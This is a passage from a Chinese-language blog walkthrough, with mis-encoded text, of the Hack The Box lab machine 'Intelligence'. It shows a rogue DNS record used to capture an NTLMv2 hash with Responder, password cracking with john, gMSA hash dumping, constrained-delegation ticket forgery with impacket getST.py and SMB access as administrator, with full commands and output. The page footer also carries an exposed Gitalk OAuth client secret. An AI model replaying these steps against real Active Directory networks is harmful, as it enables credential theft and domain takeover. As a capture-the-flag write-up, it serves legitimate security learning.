$request = Invoke-WebRequest -Uri &quot;http://$($record.Name)&quot; -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -To &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -Subject &quot;Host: $($record.Name) is down&quot;
}
} catch {}
}
</code></pre>
<p>æˆ‘ä»¬è§£è¯»ä¸€ä¸‹è¯¥æ–‡ä»¶çš„å†…å®¹ï¼Œæ¯äº”åˆ†é’Ÿï¼Œå®ƒä¼šæ£€æŸ¥ä»¥â€œwebâ€å¼€å¤´çš„åŸŸ<code>intelligence.htb</code>çš„ä»»ä½•DNSè®°å½•ï¼Œå¹¶ä½¿ç”¨<code>Ted</code>çš„å‡­æ®ä¸ºæ¯ä¸ªæ‰¾åˆ°çš„åŸŸå‘é€HTTPè¯·æ±‚ã€‚(ä½¿ç”¨<code>-UseDefaultCredentials</code>é€‰é¡¹)å¦‚æœæœåŠ¡å™¨æ²¡æœ‰è¿”å›200 OKçŠ¶æ€ç ï¼Œåˆ™ä¼šå‘<code>Ted</code>å‘é€ä¸€å°é‚®ä»¶ã€‚</p>
<p>æˆ‘ä»¬è¦åšçš„æ˜¯ä½¿ç”¨<code>dnstool.py</code>æ·»åŠ ä¸€ä¸ªä»webå¼€å§‹ä¸å­˜åœ¨çš„å‡VHOSTåˆ°zoneã€‚è¿™æ ·å°±ä¼šè§¦å‘è„šæœ¬å‘<code>Ted</code>å‘é€é‚®ä»¶ã€‚ &gt; <a href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py" target="_blank" rel="noopener">https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py</a></p>
<pre><code class="Plain">python3 dnstool.py -u &#39;intelligence.htb\Tiffany.Molina&#39; -p &#39;NewIntelligenceCorpUser9876&#39; -a add -r &#39;weboops.intelligence.htb&#39; -d 10.10.14.40 10.10.10.248
10.10.14.40 æ˜¯æˆ‘ä»¬æœ¬åœ°çš„IP
10.10.10.248 æ˜¯é¶æœºçš„IP
</code></pre>
<p>è¯¥è„šæœ¬ä¼šå‘æˆ‘ä»¬å‘é€ç”µå­é‚®ä»¶ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨<code>responder</code>æ¥è¿›è¡Œå—…æ¢å¹¶æ•è·<code>Ted</code>ç”¨æˆ·çš„å¯†ç Hashå€¼</p>
<pre><code class="Plain">responder -I tun0 -A
</code></pre>
<p>æ‰§è¡Œåï¼Œç”±äºè¯¥è„šæœ¬æ¯äº”åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡ï¼Œæ‰€ä»¥å’±ä»¬éœ€è¦ç­‰ç­‰</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# responder -I tun0 -A
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [ON]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.40]
    Challenge set              [random]
    Don&#39;t Respond To Names     [&#39;ISATAP&#39;]

[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.14.40) is not on the same subnet than the DNS server (192.168.72.2).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[+] Listening for events...
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:0daa3ec1b284a949:CD76623716C3609875D86DDA36EB0EDF:0101000000000000A604499B3D73D7015C5EEEC5D556C5D8000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000000000000200000035C7091E068F4D7CCC464ABE730F3C960A0B592A633A716B97E3209EF5BD0D30A0010000000000000000000000000000000000009003A0048005400540050002F007700650062006F006F00700073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
</code></pre>
<p>æˆåŠŸæ•è·hashï¼Œå’±ä»¬ä¿å­˜åˆ°æœ¬åœ°</p>
<p>å’±ä»¬è¿™é‡Œä½¿ç”¨johnè¿›è¡Œhashçˆ†ç ´ï¼Œå¤§å®¶ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–å·¥å…·ï¼Œæ¯”å¦‚hashcat</p>
<pre><code class="Plain">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre>
<p>çˆ†ç ´å®Œä»¥åæŸ¥çœ‹hash.txt</p>
<pre><code class="Plain">johb --show hash.txt
</code></pre>
<p>æˆåŠŸè·å¾—è´¦å·å¯†ç </p>
<pre><code class="Plain">username = Ted.Graves
password = Mr.Teddy
</code></pre>
<p>æˆ‘ä»¬æˆåŠŸæ‹¿åˆ°äº†Tedçš„è´¦æˆ·å¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•å°†ç”¨æˆ·å…±äº«æŒ‚è½½ä¸ºTedå¹¶æšä¸¾</p>
<pre><code class="Plain">mkdir mount ;sudo mount //10.10.10.248/Users mount/ -o username=â€Ted.Gravesâ€,password=â€Mr.Teddyâ€
</code></pre>
<p>å¯æƒœçš„æ˜¯ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œè‹¦äºæ²¡æœ‰æ€è·¯ï¼Œæˆ‘åˆå»æ£€æŸ¥äº†ä¸€éä¹‹å‰æ‰¾åˆ°çš„æ–‡ä»¶ï¼Œåœ¨<code>2020-12-30-upload.pdf</code>ä¸­ï¼Œè¿˜çœŸå‘ç°äº†ç‚¹ä¸œè¥¿</p>
<pre><code class="Plain">Internal IT Update

There has recently been some outages on our web servers. Ted has gotten ascript in place to help notify us if this happens again.Also, after discussion following our recent security audit we are in the processof locking down our service accounts.
</code></pre>
<p>å¤§è‡´æ„æ€å°±æ˜¯è¯´ä»–ä»¬è¿˜æ²¡æœ‰é”å®šæœåŠ¡è´¦æˆ·ã€‚é€šè¿‡GoogleæŸ¥æ‰¾åå‘ç°ï¼Œå¦‚æœå¯ç”¨äº†æœåŠ¡è´¦æˆ·ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>gMASDumper.py</code>è½¬å‚¨Hashå€¼ã€‚</p>
<h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><blockquote>
<p><a href="https://github.com/micahvandeusen/gMSADumper" target="_blank" rel="noopener">https://github.com/micahvandeusen/gMSADumper</a></p>
</blockquote>
<p>å’±ä»¬ä½¿ç”¨è¿™ä¸ªè„šæœ¬ä¸ºTedè·å–ä¸€ä¸ªNTHash</p>
<pre><code class="Plain">python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
</code></pre>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/gMSADumper]
â””â”€# python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
</code></pre>
<p>æœ‰äº†è¿™ä¸ªä¹‹åï¼Œå’±ä»¬å¯ä»¥åšPTTï¼ˆPass The Ticketï¼‰æ”»å‡»ã€‚</p>
<p>å’±ä»¬ä½¿ç”¨ntpdateè¿›è¡Œåˆ©ç”¨</p>
<pre><code class="Plain">ntpdate 10.10.10.248
</code></pre>
<p>å¦‚æœè¿è¡Œåæ—¶é—´æ²¡æœ‰æ›´æ”¹ï¼Œä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è§£å†³</p>
<pre><code class="Plain">apt-get install chrony
timedatectl set-ntp true
ntpdate 10.10.10.248
</code></pre>
<p>ä½¿ç”¨pythonè‡ªå¸¦çš„getST.pyä»¥ç®¡ç†å‘˜èº«ä»½è·å–ç¥¨æ®ï¼Œä»¥ä¾¿äºæˆ‘ä»¬ä»¥ç”¨æˆ·èº«ä»½è¿è¡Œå‘½ä»¤</p>
<pre><code class="Plain">python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator
</code></pre>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/gMSADumper]
â””â”€# python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator                   127 â¨¯
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
</code></pre>
<p>ç¥¨æ®å·²ä¿å­˜ä¸º<code>administrator.ccache</code>ï¼Œæœ‰äº†è¿™ä¸ªç¥¨æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å„ç§å·¥å…·è¿›è¡Œåˆ©ç”¨äº† ä½¿ç”¨<code>export</code>æ¥å°†ç¥¨æ®ä½œä¸ºç¯å¢ƒå˜é‡</p>
<pre><code class="Plain">export KRB5CCNAME=administrator.ccache
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬ç»§ç»­ä½¿ç”¨pythonçš„å·¥å…·<code>smbclient.py</code>è¿›è¡Œåˆ©ç”¨</p>
<pre><code class="Plain">python3 /usr/share/doc/python3-impacket/examples/smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass
</code></pre>
<p>è¿›å…¥åï¼Œæˆ‘ä»¬å°±æˆåŠŸä½¿ç”¨smbclient.pyç™»å½•åˆ°smbé‡Œäº†</p>
<p>è¿›å…¥åï¼Œå’±ä»¬è·å–rootæƒé™çš„flagæ–‡ä»¶å³å¯</p>
<pre><code class="Plain">shares
use Users
ls
cd Administrator
cd Desktop
get root.txt
</code></pre>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# cat root.txt
69f9f1591b2d1701721d539a138c3ce9
</code></pre>
<p>æˆåŠŸè·å¾—rootæƒé™çš„flagæ–‡ä»¶</p>
<p>æ”¶å·¥ç¡è§‰</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/&title=ã€ŠIntelligence - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/&title=ã€ŠIntelligence - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠIntelligence - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/07/11/Hackthebox%20-%20Proper/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Proper - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/07/06/Hackthebox%20-%20Explore/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Explore - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        ç«™ç‚¹æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        ç«™ç‚¹æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/&title=ã€ŠIntelligence - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/&title=ã€ŠIntelligence - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠIntelligence - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/07/07/Hackthebox%20-%20Intelligence/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACq0lEQVR42u3aMXIjMQwEQP//07rE2ZVWMyDhUtCMXNZ6zWZAQgP+/MTj9TjePf/88/Pz/7//3d9eGHh4eHgLU28/TZDtYg3fgIeHh7fGazf355femnoynw8WPDw8vC/gnZTO7RK05TUeHh7e9/Pyjf75mfY9eHh4eN/AS+KGHJCHCO0hsZi14OHh4XVJabTdf8/PK/09PDw8vOOuer7h5kFt3kg7mefvG/Dw8PAWeOeR663iO/+/bRSCh4eHt8FLCuhZIz9vZZ0cElGYi4eHh3eJ15bReWE9u0rVttCOWl94eHh4x7yTFn7+m/ZtswMGDw8Pb5uXlKqzKHZ2VNThQvvNAA8PD++Al1+QSjbltvieRbez+eDh4eHd4rUBQTvdW7HscA54eHh4C7yklZUXwScXBdr2WHFQ4eHh4S3w8nA2iRtmb8tDk+RTPDw8vD3eqxx5bNGW5m3kES0uHh4e3hrvVnjabtz5Za9Z4IuHh4e3wcsD1tm02nB29vyHv8XDw8Nb451fDshDh9nRMmyz4eHh4V3l5VNpFyJZmrzUnoXLeHh4eHu8vDWVb80bR0V+PNQnFR4eHl7JOy+m21CjbaQNI108PDy8Bd7sy//sEkB+xaq9NVa/Hw8PD+8qL79KlW/E0QWpYInzqOLDNQI8PDy8Y167fScTbQv09srX0SmHh4eHt1xA50VwTj1B1vPEw8PD+xNe3oh6Hm2JfHdZ8fDw8DZ4r3Kch7x5iTxLU95eusLDw8O7xJs15m+Fue3xcN5Iw8PDw7vFyw+DZLp582xvIfDw8PD+hncSy95q+f9sDDw8PLwv4LXHSV4Wz578sEx4eHh4X8bLA9ZZy609YC4fDHh4eHjHYUQ+9Rn7JHT4cDDg4eHhXeW13+jvFtCzC16LgQUeHh7e0/gHMwEr8ENP8HgAAAAASUVORK5CYII=" alt="å¾®ä¿¡åˆ†äº«äºŒç»´ç ">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
